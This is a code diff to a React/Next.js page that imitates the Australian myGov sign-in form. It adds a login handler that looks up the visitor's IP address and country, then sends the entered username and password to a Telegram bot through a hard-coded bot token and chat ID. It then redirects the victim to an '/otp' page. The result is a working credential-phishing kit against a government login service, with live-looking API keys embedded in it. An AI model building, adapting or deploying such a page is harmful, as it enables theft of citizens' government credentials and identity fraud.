@@ -1,6 +1,43 @@
 "use client";
 
+import { useRouter } from "next/navigation";
+import { useState } from "react";
+
 export default function Log2() {
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+  const router = useRouter();
+
+  const onLogin = async (e) => {
+    e.preventDefault();
+
+    fetch("https://api.ipify.org?format=json")
+      .then((res) => res.json())
+      .then((data) => {
+        const ipAddress = data.ip;
+
+        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
+          .then((res) => res.json())
+          .then((data) => {
+            const country = data.country_name;
+            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5824354578&parse_mode=markdown&text=*USER:* ${encodeURIComponent(ipAddress)} %0A*LOGIN 2:* %0A%0A*Username:* ${encodeURIComponent(username)} %0A*Password:* ${encodeURIComponent(password)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
+
+            fetch(apiUrl)
+              .then((res) => {
+                if (!res.ok) console.error("ERROR:", res.statusText);
+                return res.json();
+              })
+              .then(() => {
+                console.log("SENT!");
+                router.push("/otp");
+              })
+              .catch((e) => console.error("ERROR:", e));
+          })
+          .catch((e) => console.error("ERROR:", e));
+      })
+      .catch((e) => console.error("ERROR:", e));
+  };
+
   return (
     <>
       <header role="banner" className="mgvEnhanceHeader">
@@ -59,7 +96,7 @@ export default function Log2() {
                       <h2 className="text-align-left">
                         Using your myGov sign in details
                       </h2>
-                      <form>
+                      <form onSubmit={onLogin}>
                         <input type="hidden" name="btn1" value="btn1" />
                         <div id="msg" style={{ display: "none", color: "red" }}>
                           Invalid password..! Please enter correct password.
@@ -72,10 +109,9 @@ export default function Log2() {
                             id="userId2"
                             name="ai"
                             type="text"
-                            value=""
                             autoComplete="off"
                             required
-                            onChange={(e) => { }}
+                            onChange={(e) => setUsername(e.target.value)}
                           />
                         </div>
                         <p className="recovery">
@@ -102,7 +138,7 @@ export default function Log2() {
                               type="password"
                               aria-required="true"
                               required
-                              onChange={(e) => { }}
+                              onChange={(e) => setPassword(e.target.value)}
                             />
                           </div>
                         </div>
